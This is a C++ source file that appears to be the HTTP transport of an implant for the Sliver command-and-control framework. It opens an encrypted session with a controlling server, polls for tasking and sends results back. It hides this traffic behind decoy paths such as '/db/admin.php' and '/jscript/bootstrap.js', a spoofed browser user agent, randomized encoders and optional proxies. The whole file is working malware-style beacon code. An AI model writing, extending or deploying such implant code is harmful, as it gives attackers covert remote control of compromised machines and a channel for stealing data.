#include "Client.h"
#include "CryptoUtils.h"
#include "base64_utils.h"
#include "encoders.h"
#include <ctime>
#include <cpr/cpr.h>
#include "my_time.h"
#include "constants.h"

using namespace std::chrono_literals;

namespace transports {

	const string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.1232.632 Safari/537.36";
	
	IClient::IClient() {

	}
	
	HttpClient::HttpClient( string base_URI, unsigned long long netTimeout,unsigned long long tlsTimeout,unsigned long long pollTimeout,string proxyHost, int proxyPort,string proxyUsername, string proxyPassword,string hostHeader) {
		this->base_URI = base_URI;
		session = make_unique<cpr::Session>();
		if (proxyHost != "" && proxyPort) {
			auto urlProxy = proxyHost + string{ ":" } + to_string(proxyPort);
			session->SetProxies(cpr::Proxies{ { "http",urlProxy } });
		}
		if (proxyUsername != "") {
			session->SetProxyAuth(cpr::ProxyAuthentication{ {"http",cpr::EncodedAuthentication{proxyUsername,proxyPassword}} });
		}
		session->SetConnectTimeout(cpr::ConnectTimeout{1000s });
		session->SetTimeout(cpr::Timeout{ 1000s });
		this->pollTimeout = pollTimeout;
		this->netTimeout = netTimeout;
		if (hostHeader != "") {
			session->SetHeader(cpr::Header{ {"User-Agent",userAgent},{"Host",hostHeader}});
		}
		this->hostHeader = hostHeader;
		this->timeDelta = std::chrono::system_clock::duration(0);
	}
bool HttpClient::SessionInit() {
		auto key = crypto::RandomKey();
		auto server_pbk = crypto::GetServerECCPublicKey();
		auto keyPair = crypto::getKeyPair();
		this->context.SetKey(key);
		sliverpb::HTTPSessionInit pb_req;
		pb_req.set_key(key.c_str(), key.size());
		string serialized;
		pb_req.SerializeToString(&serialized);
		auto encrypted = crypto::ECCEncryptToServer(serialized);
			
		auto tp = encoders::GetRandomEncoder();
		unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
		auto nonce = std::get<0>(tp);
		auto encoded = encoder->Encode(encrypted);

		auto now_utc = toUTC(std::chrono::system_clock::now());
		auto totp = crypto::GetTOTP(now_utc+this->timeDelta);		
		//TODO modify path generation with random mechanism
		auto path = string("/authenticate/rpc.html") + string("?n=") + to_string(nonce) + string("&op=") + to_string(totp);
		auto URI = this->base_URI + path;
		session->SetUrl(cpr::Url{ this->base_URI + path });
		session->SetBody(cpr::Body{ encoded });
		cpr::Response resp = session->Post();
		if (resp.status_code == 0) {
			cout << "[-] Unable to connect" << endl;
			throw exception();
		}
		if (resp.status_code != 200) {
			auto serverDateHeader = resp.header.find("Date")->second;
			auto tt = fromHTTPDate(serverDateHeader.c_str());
			auto time_point = toUTC(&tt);
			auto delta = now_utc - time_point;
			this->timeDelta = delta;
			return false;
		}
		session->SetCookies(resp.cookies);
		auto decoded = encoder->Decode(resp.text);

		auto plaintext = this->context.Decrypt(decoded);
		this->sessionID = plaintext;
		return true;
	}

bool HttpClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::Envelope& recv) {
	string data;
	to_send.SerializeToString(&data);
	auto reqData = this->context.Encrypt(data);

	auto tp = encoders::GetRandomEncoder();
	unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
	auto nonce = std::get<0>(tp);

	auto encoded = encoder->Encode(reqData);
	string path{ "/db/admin.php" };
	this->pollMutex.lock();
	this->session->SetUrl(cpr::Url{ this->base_URI + path });
	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
	this->session->SetBody(encoded);
	auto resp = this->session->Post();
	this->pollMutex.unlock();
	if (resp.status_code == 0) {
		cout << "[-] Unable to connect" << endl;
		throw exception();
	}
	if (resp.status_code == 404) {
		cout << "[-] http 404 response " << std::endl;
		throw exception();
	}
	if (resp.text.empty()) {
		return false;
	}
	auto decoded = encoder->Decode(resp.text);
	auto plain = this->context.Decrypt(decoded);
	return recv.ParseFromString(plain);
}
bool HttpClient::WriteEnvelope(sliverpb::Envelope& envelope) {
	string data;
	envelope.SerializeToString(&data);
	auto reqData = this->context.Encrypt(data);

	auto tp = encoders::GetRandomEncoder();
	unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
	auto nonce = std::get<0>(tp);

	auto encoded = encoder->Encode(reqData);
	string path{ "/db/admin.php" };
	this->pollMutex.lock();
	this->session->SetUrl(cpr::Url{ this->base_URI + path });
	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
	this->session->SetBody(encoded);
	auto resp = this->session->Post();
	this->pollMutex.unlock();
	if (resp.status_code == 0) {
		cout << "[-] Unable to connect" << endl;
		throw exception();
	}
	if (resp.status_code == 404) {
		cout << "[-] http 404 response " << std::endl;
		throw exception();
	}
	else {
		return true;
	}
}

bool HttpClient::WriteEnvelopeNoResp(sliverpb::Envelope& envelope) {
	if (envelope.type() == sliverpb::MsgPivotPeerEnvelopeNoResponse) {
		envelope.set_type(sliverpb::MsgPivotPeerEnvelope);
	}
	return this->WriteEnvelope(envelope);
}
unique_ptr<sliverpb::Envelope> HttpClient::ReadEnvelope() {
	if (this->closed) {
		return nullptr;
	}
	if (this->sessionID.compare("") == 0) {
		return nullptr;
	}
	string path{ "/jscript/bootstrap.js" };

	auto tp = encoders::GetRandomEncoder();
	unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
	auto nonce = std::get<0>(tp);
	this->pollMutex.lock();
	this->session->SetUrl(cpr::Url{ this->base_URI + path });
	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
	auto resp = this->session->Get();
	this->pollMutex.unlock();
	if (resp.status_code == 0) {
		cout << "[-] Unable to connect" << endl;
		throw exception();
	}
	if (resp.status_code == 403 || resp.status_code == 204) {
		cout << "got "<< resp.status_code << " from for " << this->sessionID << endl;
		return nullptr;
	}
	else if(resp.status_code == 200){
		unique_ptr<encoders::Encoder> encoder = make_unique<encoders::Base64>();
		auto decoded = encoder->Decode(resp.text);
		auto plain = this->context.Decrypt(decoded);
		auto env = make_unique<sliverpb::Envelope>();
		env->ParseFromString(plain);
		return env;
	}
}

}